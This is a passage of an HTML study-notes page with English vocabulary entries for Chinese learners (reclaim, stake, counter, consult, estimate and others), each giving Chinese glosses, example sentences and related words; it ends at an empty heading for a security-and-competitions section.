<p>'prosperity'这个词也可以指成功的状态，特别是在财务或经济方面。</p>
</div>
<p>词根sp表示看，观察</p>
<p>spy 间谍，侦探;suspect 怀疑，猜疑,inspect 检查，视察,respect 尊重，尊敬</p>
<p>prospect 前景，展望， circumspect 小心谨慎的，谨慎的，</p>
<p>spectator 观众，旁观者 speculate 推测，猜测,spectacular 壮观的，引人注目的</p>
<p>perspective 观点，看法，透视，透视图，透视图</p>
<p>conspicuous 引人注目的，显眼的</p>
<p>retrospect 回顾，回顾性</p>
<h2 id="note-language-english-part-2">PART 2<a class="headerlink" href="#note-language-english-part-2" title="Permanent link">&para;</a></h2>
<p><span style="color: red;">reclaim</span></p>
<ul>
<li>v.<ul>
<li>取回, 拿回</li>
<li>开垦, 改造</li>
<li>回收利用</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>She managed to reclaim her lost wallet.</p>
<p>她设法找回了丢失的钱包。</p>
<p>The term 'reclaim' can also refer to the process of retrieving or recovering something previously lost or taken.</p>
<p>'reclaim'这个词也可以指取回或恢复以前丢失或被拿走的东西。</p>
</div>
<p>reclaim 取回，拿回，开垦，改造，回收利用</p>
<p>reclaimable 可回收的，可开垦的</p>
<p>reclamation 开垦，改造，回收</p>
<p>proclaim 宣布，宣告</p>
<p>exclaim 惊呼，惊叫</p>
<p>acclaim 喝彩，称赞</p>
<p>declaim 断言，宣称</p>
<p><span style="color: red;">refine</span></p>
<ul>
<li>v.<ul>
<li>精炼, 提纯</li>
<li>改进, 改善</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The company refined the product to improve its quality.</p>
<p>该公司精炼产品以提高其质量。</p>
<p>The term 'refine' can also refer to the process of improving or enhancing something, especially in terms of quality or purity.</p>
<p>'refine'这个词也可以指改进或提高某物，特别是在质量或纯度方面。</p>
</div>
<p><span style="color: red;">sufficient</span></p>
<ul>
<li>adj.<ul>
<li>足够的, 充足的</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The food supply was sufficient for the entire village.</p>
<p>食物供应足够整个村庄使用。</p>
<p>The term 'sufficient' can also refer to having enough of something to meet the needs or requirements.</p>
<p>'sufficient'这个词也可以指有足够的东西来满足需求或要求。</p>
</div>
<p><span style="color: red;">rival</span></p>
<ul>
<li>n.<ul>
<li>竞争对手, 对手</li>
<li>敌手, 竞争者</li>
</ul>
</li>
<li>v.<ul>
<li>竞争, 对抗</li>
<li>与...匹敌, 比得上</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The two companies were fierce rivals in the market.</p>
<p>这两家公司在市场上是激烈的竞争对手。</p>
<p>The term 'rival' can also refer to someone or something that competes with another for the same objective or superiority in the same field.</p>
<p>'rival'这个词也可以指在同一领域中为相同目标或优越性而竞争的人或事物。</p>
</div>
<p><span style="color: red;">stake</span></p>
<ul>
<li>n.<ul>
<li>桩, 标桩</li>
<li>股份, 利害关系</li>
<li>赌注, 奖金</li>
</ul>
</li>
<li>v.<ul>
<li>用桩支撑, 用桩标出</li>
<li>下注, 投资</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>He drove a stake into the ground to mark the boundary.</p>
<p>他在地上打了一根桩来标记边界。</p>
<p>The company has a significant stake in the new project.</p>
<p>该公司在新项目中有重要的股份。</p>
<p>The term 'stake' can also refer to a personal or financial interest or involvement in something.</p>
<p>'stake'这个词也可以指在某事中的个人或财务利益或参与。</p>
<p><span style="color: blue;">at stake</span></p>
<ul>
<li>phrase.<ul>
<li>处于危险中, 处于成败关头</li>
<li>有风险, 有可能失去</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The future of the company is at stake.</p>
<p>公司的未来岌岌可危。</p>
<p>There is a lot of money at stake in this venture.</p>
<p>这项风险投资中有大量资金处于危险之中。</p>
<p>The term 'at stake' can also refer to something that is at risk or in a position to be won or lost.</p>
<p>'at stake'这个词也可以指处于风险中或处于成败关头的事物。</p>
</div>
</div>
<p><span style="color: red;">subsidy</span></p>
<ul>
<li>n.<ul>
<li>补贴, 津贴</li>
<li>财政资助</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The government provided a subsidy to help the farmers.</p>
<p>政府提供了补贴来帮助农民。</p>
<p>The term 'subsidy' can also refer to financial assistance given by the government to support a specific sector or activity.</p>
<p>'subsidy'这个词也可以指政府为支持特定部门或活动而提供的财政援助。</p>
</div>
<p><span style="color: red;">estate</span></p>
<ul>
<li>n.<ul>
<li>财产, 资产</li>
<li>房地产, 不动产</li>
<li>庄园, 庄园住宅</li>
</ul>
</li>
</ul>
<p>real estate 房地产</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>He inherited a large estate from his uncle.</p>
<p>他从叔叔那里继承了一大笔财产。</p>
<p>The real estate market is booming in the city.</p>
<p>该市的房地产市场正在蓬勃发展。</p>
<p>The family owns a beautiful estate in the countryside.</p>
<p>这家人在乡下拥有一个美丽的庄园。</p>
<p>The term 'estate' can also refer to all the money and property owned by a particular person, especially at death.</p>
<p>'estate'这个词也可以指某人拥有的所有钱财和财产，尤其是在去世时。</p>
</div>
<p><span style="color: red;">recede</span></p>
<ul>
<li>v.<ul>
<li>后退, 退却</li>
<li>减弱, 减少</li>
<li>变秃</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The floodwaters began to recede after the heavy rain stopped.</p>
<p>暴雨停止后，洪水开始退去。</p>
<p>His hairline has started to recede as he gets older.</p>
<p>随着年龄的增长，他的发际线开始后退。</p>
<p>The pain in his leg gradually receded.</p>
<p>他腿上的疼痛逐渐减轻。</p>
<p>The term 'recede' can also refer to something moving back or becoming less intense.</p>
<p>'recede'这个词也可以指某物后退或变得不那么强烈。</p>
</div>
<p><span style="color: red;">relieve</span></p>
<ul>
<li>v.<ul>
<li>减轻, 缓解</li>
<li>解除, 免除</li>
<li>救济, 救援</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The medication helped to relieve the pain.</p>
<p>药物有助于减轻疼痛。</p>
<p>He was relieved of his duties after the incident.</p>
<p>事件发生后，他被免除了职务。</p>
<p>The charity works to relieve poverty in the region.</p>
<p>该慈善机构致力于缓解该地区的贫困。</p>
<p>The term 'relieve' can also refer to making a problem or bad situation less serious.</p>
<p>'relieve'这个词也可以指使问题或糟糕的情况变得不那么严重。</p>
</div>
<p><span style="color: red;">counter</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>计数器, 计算器</li>
<li>柜台, 柜台式长桌</li>
<li>反驳, 反对</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>反驳, 反对</li>
</ul>
</li>
<li>
<p>adv.</p>
<ul>
<li>相反, 相反地</li>
</ul>
</li>
</ul>
<p>CSGO (Counter-Strike: Global Offensive) 反恐精英:全球攻势</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The counter displayed the number of visitors to the website.</p>
<p>计数器显示了网站的访问者数量。</p>
<p>She placed her order at the counter.</p>
<p>她在柜台下了订单。</p>
<p>His argument was met with a strong counter.</p>
<p>他的论点遭到了强烈的反驳。</p>
<p>The term 'counter' can also refer to something that opposes or goes against something else.</p>
<p>'counter'这个词也可以指反对或对抗某事物。</p>
</div>
<p>account 账户, 账目, 解释, 说明 accountant 会计</p>
<p>unaccountable 无法解释的, 不可原谅的 </p>
<p>counterpart 对应物, 副本, 对应的人</p>
<p>encounter 遭遇, 遇到 </p>
<p>discount 折扣, 打折</p>
<p><span style="color: red;">wholesale</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>批发, 批发业务</li>
<li>大规模, 大批量</li>
</ul>
</li>
<li>
<p>adj.</p>
<ul>
<li>批发的, 大规模的</li>
</ul>
</li>
<li>
<p>adv.</p>
<ul>
<li>以批发方式, 大规模地</li>
</ul>
</li>
</ul>
<p>反义词:retail 零售</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The company specializes in the wholesale of electronic goods.</p>
<p>这家公司专门从事电子产品的批发业务。</p>
<p>They bought the goods at wholesale prices.</p>
<p>他们以批发价购买了这些商品。</p>
<p>The policy led to the wholesale destruction of the environment.</p>
<p>这项政策导致了环境的大规模破坏。</p>
<p>The term 'wholesale' can also refer to the selling of goods in large quantities at lower prices.</p>
<p>'wholesale'这个词也可以指以较低价格大批量销售商品。</p>
</div>
<p><span style="color: red;">transact</span></p>
<ul>
<li>v.<ul>
<li>处理, 办理, 交易</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>They decided to transact the business in private.</p>
<p>他们决定私下处理这笔业务。</p>
<p>The bank transacts all its business in a professional manner.</p>
<p>这家银行以专业的方式处理所有业务。</p>
<p>The term 'transact' can also refer to conducting or carrying out business or negotiations.</p>
<p>'transact'这个词也可以指进行或开展业务或谈判。</p>
</div>
<p><span style="color: red;">triple</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>三倍, 三重, 三个一组</li>
</ul>
</li>
<li>
<p>adj.</p>
<ul>
<li>三倍的, 三重的</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>使成三倍, 增至三倍</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The company aims to triple its revenue in the next five years.</p>
<p>这家公司计划在未来五年内将收入增加到三倍。</p>
<p>She ordered a triple espresso to stay awake.</p>
<p>她点了一杯三倍浓度的浓缩咖啡以保持清醒。</p>
<p>The term 'triple' can also refer to something that is three times as much or as many.</p>
<p>'triple'这个词也可以指三倍的数量或程度。</p>
</div>
<p><span style="color: red;">radiate</span></p>
<ul>
<li>v.<ul>
<li>辐射, 发射, 散发</li>
<li>流露, 显示</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The sun radiates light and heat.</p>
<p>太阳辐射光和热。</p>
<p>She radiates confidence and charm.</p>
<p>她流露出自信和魅力。</p>
<p>The term 'radiate' can also refer to spreading out in all directions from a central point.</p>
<p>'radiate'这个词也可以指从中心点向各个方向扩散。</p>
</div>
<p><span style="color: red;">spark</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>火花, 火星</li>
<li>闪光, 闪现</li>
<li>导火线, 诱因</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>发出火花, 闪烁</li>
<li>引发, 激发</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The spark from the firework lit up the night sky.</p>
<p>烟花的火花照亮了夜空。</p>
<p>Her speech sparked a lot of interest in the topic.</p>
<p>她的演讲激发了人们对这个话题的浓厚兴趣。</p>
<p>The term 'spark' can also refer to a small amount of a quality or feeling.</p>
<p>'spark'这个词也可以指少量的某种品质或感觉。</p>
</div>
<p><span style="color: red;">splash</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>飞溅, 溅泼</li>
<li>溅泼声</li>
<li>亮点, 引人注目的效果</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>溅, 泼</li>
<li>使(液体)飞溅</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The splash of water was refreshing on a hot day.</p>
<p>在炎热的夏天，水的飞溅让人感到清爽。</p>
<p>The artist added a splash of color to the painting.</p>
<p>艺术家在画中添加了一抹亮色。</p>
<p>The term 'splash' can also refer to a prominent or sensational effect.</p>
<p>'splash'这个词也可以指引人注目的效果。</p>
</div>
<p>blush 脸红, 羞红</p>
<p>flush 冲洗</p>
<p><span style="color: red;">assimilate</span></p>
<ul>
<li>v.<ul>
<li>吸收, 消化</li>
<li>同化, 融入</li>
<li>理解, 领会</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The immigrants found it difficult to assimilate into the new culture.</p>
<p>移民们发现很难融入新的文化。</p>
<p>The students quickly assimilated the new information.</p>
<p>学生们很快吸收了新信息。</p>
<p>The term 'assimilate' can also refer to the process of fully understanding and integrating new ideas or experiences.</p>
<p>'assimilate'这个词也可以指完全理解和整合新的想法或经历。</p>
</div>
<p><span style="color: red;">append</span></p>
<ul>
<li>v.<ul>
<li>附加, 添加</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The document was appended with a new section.</p>
<p>文件被添加了一个新部分。</p>
<p>The term 'append' can also refer to adding something to the end of a list or sequence.</p>
<p>'append'这个词也可以指将某物添加到列表或序列的末尾。</p>
</div>
<p>suspend 悬挂, 暂停, 中止</p>
<p><span style="color: red;">alleviate</span></p>
<ul>
<li>v.<ul>
<li>减轻, 缓和, 缓解</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The medication helped to alleviate the patient's pain.</p>
<p>药物帮助减轻了病人的疼痛。</p>
<p>The government implemented measures to alleviate poverty.</p>
<p>政府采取了措施来缓解贫困。</p>
<p>The term 'alleviate' can also refer to making a problem or suffering less severe.</p>
<p>'alleviate'这个词也可以指使问题或痛苦减轻。</p>
</div>
<p><span style="color: red;">assumption</span></p>
<ul>
<li>n.<ul>
<li>假设, 设想</li>
<li>承担, 承担责任</li>
<li>假定, 假装</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The assumption that he would be late proved to be correct.</p>
<p>他会迟到的假设被证明是正确的。</p>
<p>The company's assumption of responsibility for the project was commendable.</p>
<p>该公司对项目责任的承担是值得称赞的。</p>
<p>The term 'assumption' can also refer to something that is accepted as true without proof.</p>
<p>'assumption'这个词也可以指在没有证据的情况下被接受为真的事物。</p>
</div>
<p><span style="color: red;">assure</span></p>
<ul>
<li>v.<ul>
<li>确保, 保证</li>
<li>使确信, 使放心</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>He assured her that everything would be fine.</p>
<p>他向她保证一切都会好起来的。</p>
<p>The company assured its customers of the product's quality.</p>
<p>公司向客户保证产品的质量。</p>
<p>The term 'assure' can also refer to making someone feel confident about something.</p>
<p>'assure'这个词也可以指使某人对某事感到有信心。</p>
</div>
<p>跟ensure差不多</p>
<p><span style="color: red;">accelerate</span></p>
<ul>
<li>v.<ul>
<li>加速, 促进</li>
<li>增加, 提高</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The car can accelerate from 0 to 60 mph in just a few seconds.</p>
<p>这辆车可以在几秒钟内从0加速到60英里每小时。</p>
<p>The company plans to accelerate its expansion into new markets.</p>
<p>该公司计划加速其向新市场的扩展。</p>
<p>The term 'accelerate' can also refer to the process of making something happen sooner or faster.</p>
<p>'accelerate'这个词也可以指使某事更快或更早发生的过程。</p>
</div>
<p><span style="color: red;">alter</span></p>
<ul>
<li>v.<ul>
<li>改变, 修改</li>
<li>变更, 变动</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The tailor altered the dress to fit her better.</p>
<p>裁缝修改了这件连衣裙以更好地适合她。</p>
<p>The company decided to alter its marketing strategy.</p>
<p>公司决定改变其营销策略。</p>
<p>The term 'alter' can also refer to making a change to something, usually in a small but significant way.</p>
<p>'alter'这个词也可以指对某物进行改变，通常是小但重要的改变。</p>
</div>
<p>alternative 替代品, 选择, 选择之一</p>
<p><span style="color: red;">reproach</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>责备, 指责</li>
<li>耻辱, 丢脸</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>责备, 指责</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>She looked at him with reproach in her eyes.</p>
<p>她用责备的眼神看着他。</p>
<p>His actions brought reproach upon the family.</p>
<p>他的行为给家族带来了耻辱。</p>
<p>The term 'reproach' can also refer to expressing disapproval or disappointment.</p>
<p>'reproach'这个词也可以指表达不满或失望。</p>
</div>
<p><span style="color: red;">accomplish</span></p>
<ul>
<li>v.<ul>
<li>完成, 实现</li>
<li>达到, 实现目标</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>She was able to accomplish all her goals for the year.</p>
<p>她能够完成她今年的所有目标。</p>
<p>The team worked hard to accomplish the project on time.</p>
<p>团队努力按时完成了项目。</p>
<p>The term 'accomplish' can also refer to successfully achieving something through effort or skill.</p>
<p>'accomplish'这个词也可以指通过努力或技能成功实现某事。</p>
</div>
<p><span style="color: red;">advocate</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>提倡者, 拥护者</li>
<li>辩护律师</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>提倡, 主张</li>
<li>为...辩护</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>She is a strong advocate for women's rights.</p>
<p>她是妇女权利的坚定拥护者。</p>
<p>The lawyer advocated for his client's innocence.</p>
<p>律师为他的客户的清白辩护。</p>
<p>The term 'advocate' can also refer to publicly recommending or supporting a particular cause or policy.</p>
<p>'advocate'这个词也可以指公开推荐或支持某个特定的事业或政策。</p>
</div>
<p><span style="color: red;">accuse</span></p>
<ul>
<li>v.<ul>
<li>指控, 控告</li>
<li>谴责, 责备</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>He was accused of stealing the money.</p>
<p>他被指控偷了钱。</p>
<p>The manager accused the employee of being late.</p>
<p>经理指责员工迟到。</p>
<p>The term 'accuse' can also refer to charging someone with an offense or crime.</p>
<p>'accuse'这个词也可以指控告某人犯有罪行。</p>
</div>
<p><span style="color: red;">acquire</span></p>
<ul>
<li>v.<ul>
<li>获得, 得到</li>
<li>习得, 学到</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>She managed to acquire a rare painting.</p>
<p>她设法获得了一幅稀有的画作。</p>
<p>He acquired new skills during the training.</p>
<p>他在培训期间学到了新技能。</p>
<p>The term 'acquire' can also refer to gaining possession or control of something.</p>
<p>'acquire'这个词也可以指获得某物的所有权或控制权。</p>
</div>
<p>require 需要, 要求 inquire 询问, 调查</p>
<p><span style="color: red;">ascertain</span></p>
<ul>
<li>v.<ul>
<li>确定, 查明</li>
<li>弄清, 弄明白</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The detective tried to ascertain the facts of the case.</p>
<p>侦探试图查明案件的事实。</p>
<p>She quickly ascertained that the information was incorrect.</p>
<p>她很快弄清楚了信息是错误的。</p>
<p>The term 'ascertain' can also refer to finding out something with certainty through examination or investigation.</p>
<p>'ascertain'这个词也可以指通过检查或调查确定某事。</p>
</div>
<p><span style="color: red;">patriotic</span></p>
<ul>
<li>adj.<ul>
<li>爱国的, 有爱国心的</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The citizens displayed a patriotic spirit during the national holiday.</p>
<p>在国庆期间，市民们表现出了爱国精神。</p>
<p>He felt a patriotic duty to serve his country.</p>
<p>他感到有一种爱国的责任去为国家服务。</p>
<p>The term 'patriotic' can also refer to showing love and devotion to one's country.</p>
<p>'patriotic'这个词也可以指表现出对国家的热爱和忠诚。</p>
</div>
<p><span style="color: red;">entrepreneurship</span></p>
<ul>
<li>n.<ul>
<li>创业, 企业家精神</li>
<li>创业活动, 创业能力</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>Entrepreneurship requires creativity and risk-taking.</p>
<p>创业需要创造力和冒险精神。</p>
<p>She studied entrepreneurship to start her own business.</p>
<p>她学习创业以开办自己的企业。</p>
<p>The term 'entrepreneurship' can also refer to the process of designing, launching, and running a new business.</p>
<p>'entrepreneurship'这个词也可以指设计、启动和经营新业务的过程。</p>
</div>
<p><span style="color: red;">boost</span></p>
<ul>
<li>v.<ul>
<li>提高, 增强, 促进</li>
<li>推动, 推进</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The new marketing strategy helped to boost sales.</p>
<p>新的营销策略有助于提高销售额。</p>
<p>Regular exercise can boost your energy levels.</p>
<p>定期锻炼可以提高你的能量水平。</p>
<p>The term 'boost' can also refer to increasing or improving something, especially in terms of performance or effectiveness.</p>
<p>'boost'这个词也可以指增加或改善某物，特别是在性能或效果方面。</p>
</div>
<p>boast 夸耀, 自夸, 自夸的</p>
<p><span style="color: red;">compile</span></p>
<ul>
<li>v.<ul>
<li>编译, 汇编</li>
<li>收集, 汇集</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The programmer needed to compile the code before running it.</p>
<p>程序员需要在运行代码之前编译它。</p>
<p>She compiled a list of her favorite books.</p>
<p>她汇集了一份她最喜欢的书籍清单。</p>
<p>The term 'compile' can also refer to the process of converting source code into executable code.</p>
<p>'compile'这个词也可以指将源代码转换为可执行代码的过程。</p>
</div>
<p>compilation 汇编, 编纂, 汇编物</p>
<p>compiler 编译器, 汇编者</p>
<p><span style="color: red;">bribe</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>贿赂, 行贿物</li>
<li>诱惑物</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>贿赂, 行贿</li>
<li>收买</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The official was accused of accepting a bribe.</p>
<p>这名官员被指控接受贿赂。</p>
<p>They tried to bribe the guard to let them in.</p>
<p>他们试图贿赂警卫让他们进去。</p>
<p>The term 'bribe' can also refer to offering something valuable to influence someone's actions.</p>
<p>'bribe'这个词也可以指提供有价值的东西以影响某人的行为。</p>
</div>
<p>bribery 贿赂行为, 行贿</p>
<p><span style="color: red;">coordinate</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>坐标</li>
<li>协调, 配合</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>协调, 调整</li>
<li>使...协调一致</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The coordinates of the location were marked on the map.</p>
<p>该位置的坐标标在地图上。</p>
<p>The team worked together to coordinate the event.</p>
<p>团队合作协调了这次活动。</p>
<p>The term 'coordinate' can also refer to organizing different elements to work together effectively.</p>
<p>'coordinate'这个词也可以指组织不同的元素以有效地协同工作。</p>
</div>
<p>coordination 协调, 调整, 协同</p>
<p>coordinator 协调者, 统筹者</p>
<p><span style="color: red;">condemn</span></p>
<ul>
<li>v.<ul>
<li>谴责, 指责</li>
<li>判刑, 宣判</li>
<li>使陷入困境</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The government condemned the attack on the embassy.</p>
<p>政府谴责了对大使馆的袭击。</p>
<p>He was condemned to life imprisonment.</p>
<p>他被判处终身监禁。</p>
<p>The building was condemned as unsafe.</p>
<p>这座建筑被判定为不安全。</p>
<p>The term 'condemn' can also refer to expressing strong disapproval or sentencing someone to a particular punishment.</p>
<p>'condemn'这个词也可以指表示强烈不满或判处某人特定的惩罚。</p>
</div>
<p>condemnation 谴责, 指责, 定罪</p>
<p>condemnable 应受谴责的, 应受处罚的</p>
<h2 id="note-language-english-part-3">PART 3<a class="headerlink" href="#note-language-english-part-3" title="Permanent link">&para;</a></h2>
<p><span style="color: red;">consult</span></p>
<ul>
<li>v.<ul>
<li>咨询, 请教</li>
<li>商量, 商议</li>
<li>查阅, 参考</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>She decided to consult a lawyer about the legal issues.</p>
<p>她决定就法律问题咨询律师。</p>
<p>The manager consulted with the team before making a decision.</p>
<p>经理在做决定前与团队商量。</p>
<p>He consulted the manual to find the correct procedure.</p>
<p>他查阅了手册以找到正确的程序。</p>
<p>The term 'consult' can also refer to seeking information or advice from someone or something.</p>
<p>'consult'这个词也可以指向某人或某物寻求信息或建议。</p>
</div>
<p>consultation 咨询, 商议, 会诊</p>
<p>consultant 顾问, 咨询师</p>
<p>consultative 咨询的, 顾问的</p>
<p>insult 侮辱, 辱骂</p>
<p><span style="color: red;">confer</span></p>
<ul>
<li>v.<ul>
<li>授予, 赋予</li>
<li>协商, 商议</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The university conferred an honorary degree on the distinguished professor.</p>
<p>大学授予这位杰出的教授荣誉学位。</p>
<p>The committee members conferred to discuss the new policy.</p>
<p>委员会成员们商议新政策。</p>
<p>The term 'confer' can also refer to granting or bestowing something, such as a title or degree, or to discussing something with others to reach a decision.</p>
<p>'confer'这个词也可以指授予某物，如头衔或学位，或与他人讨论以达成决定。</p>
</div>
<p>conference 会议, 讨论会</p>
<p>conferral 授予, 赋予</p>
<p>conferment 授予, 赋予</p>
<p>refer 提及, 参考</p>
<p>defer 推迟, 延期</p>
<p>fertile 肥沃的, 肥沃的, 肥沃的</p>
<p><span style="color: red;">confine</span></p>
<ul>
<li>v.<ul>
<li>限制, 局限</li>
<li>监禁, 禁闭</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The prisoners were confined to their cells.</p>
<p>囚犯们被限制在他们的牢房里。</p>
<p>The term 'confine' can also refer to restricting someone or something within certain limits or boundaries.</p>
<p>'confine'这个词也可以指在某些限制或边界内限制某人或某物。</p>
</div>
<p>confinement 监禁, 禁闭, 限制</p>
<p>confined 受限的, 狭窄的</p>
<p>define 定义, 解释</p>
<p>definite 明确的, 确定的</p>
<p>refine 精炼, 提纯</p>
<p>infinite 无限的, 无穷的</p>
<p><span style="color: red;">conserve</span></p>
<ul>
<li>v.<ul>
<li>保存, 保护</li>
<li>节约, 节省</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>We need to conserve our natural resources for future generations.</p>
<p>我们需要为子孙后代保护我们的自然资源。</p>
<p>The term 'conserve' can also refer to using something carefully to prevent waste.</p>
<p>'conserve'这个词也可以指小心使用某物以防止浪费。</p>
</div>
<p>conservation 保存, 保护, 节约</p>
<p>conservative 保守的, 守旧的</p>
<p>preserve 保存, 保护</p>
<p>reserve 保留, 预订</p>
<p>observe 观察, 遵守</p>
<p><span style="color: red;">console</span></p>
<ul>
<li>n.<ul>
<li>控制台, 操作台</li>
<li>控制面板, 仪表板</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The programmer used the console to debug the application.</p>
<p>程序员使用控制台调试应用程序。</p>
<p>The term 'console' can also refer to a panel or unit accommodating a set of controls for electronic or mechanical equipment.</p>
<p>'console'这个词也可以指容纳电子或机械设备控制装置的面板或单元。</p>
</div>
<p>consolation 安慰, 慰藉</p>
<p>consolidate 巩固, 合并</p>
<p>consult 咨询, 请教</p>
<p>consume 消耗, 消费</p>
<p><span style="color: red;">convey</span></p>
<ul>
<li>v.<ul>
<li>传达, 表达</li>
<li>运输, 传送</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The teacher used pictures to convey the concept to the students.</p>
<p>老师用图片向学生传达了这个概念。</p>
<p>The term 'convey' can also refer to transporting or carrying something from one place to another.</p>
<p>'convey'这个词也可以指将某物从一个地方运输或传送到另一个地方。</p>
</div>
<p>conveyance 运输, 传送, 表达</p>
<p>conveyor 传送带, 运输机</p>
<p>conveyer 传送者, 传播者</p>
<p><span style="color: red;">enlightened</span></p>
<ul>
<li>adj.<ul>
<li>开明的, 有见识的</li>
<li>受启发的, 启蒙的</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The leader was known for his enlightened views on social issues.</p>
<p>这位领导因其在社会问题上的开明观点而闻名。</p>
<p>The term 'enlightened' can also refer to someone who has been given greater knowledge and understanding about a subject or situation.</p>
<p>'enlightened'这个词也可以指在某个主题或情况下获得更多知识和理解的人。</p>
</div>
<p>enlighten 启发, 启蒙</p>
<p>enlightenment 启蒙, 启发</p>
<p><span style="color: red;">dictate</span></p>
<ul>
<li>v.<ul>
<li>口述, 听写</li>
<li>命令, 指示</li>
<li>支配, 决定</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>She dictated the letter to her assistant.</p>
<p>她向助理口述了这封信。</p>
<p>The manager dictated the terms of the agreement.</p>
<p>经理规定了协议的条款。</p>
<p>The term 'dictate' can also refer to determining or influencing something.</p>
<p>'dictate'这个词也可以指决定或影响某事。</p>
</div>
<p>dictation 听写, 口述</p>
<p>dictator 独裁者, 专制者</p>
<p>dictatorial 独裁的, 专制的</p>
<p><span style="color: red;">estimate</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>估计, 估算</li>
<li>评估, 评价</li>
<li>报价, 预算</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>估计, 估算</li>
<li>评估, 评价</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The engineer provided an estimate for the cost of the project.</p>
<p>工程师提供了项目成本的估算。</p>
<p>It is difficult to estimate the exact number of people affected.</p>
<p>很难准确估计受影响的人数。</p>
<p>The term 'estimate' can also refer to forming an approximate judgment or opinion regarding the value, amount, size, or weight of something.</p>
<p>'estimate'这个词也可以指对某物的价值、数量、大小或重量形成大致的判断或意见。</p>
</div>
<p>estimation 估计, 评价</p>
<p>estimated 估计的, 预计的</p></section></section></section>
                    <section class='print-page md-section' id='section-2-5' heading-number='2.5'>
                        <h1>🛡️ 安全与竞赛<a class='headerlink' href='#section-2-5' title='Permanent link'></a>
                        </h1>
                    
